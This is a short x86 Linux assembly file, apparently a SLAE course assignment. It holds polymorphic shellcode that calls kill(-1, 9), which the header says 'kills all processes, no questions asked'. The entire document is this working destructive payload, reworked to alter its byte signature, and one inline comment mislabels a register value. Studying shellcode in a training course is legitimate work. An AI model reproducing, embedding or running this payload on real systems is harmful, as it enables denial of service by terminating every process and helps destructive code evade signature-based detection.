; SLAE Assigment 6 - Polymorphic shellcode 1
; Author: rtmcx (rtmcx@protonmail.com)
;
; Executes "sys_kill(-1, 9)"
; which kills all processes, no questions asked

global _start

section .text
_start:
	
	 xor eax, eax	; eax null
	 add al, 37		; eax 37
	 xor ebx, ebx	; ebx null
	 sub ebx, 1		; ebx -1
	 xor ecx, ecx	; ecx -1
	 mov cl, 09		; ecx 9
	 int 0x80		; Execute syscall
  		
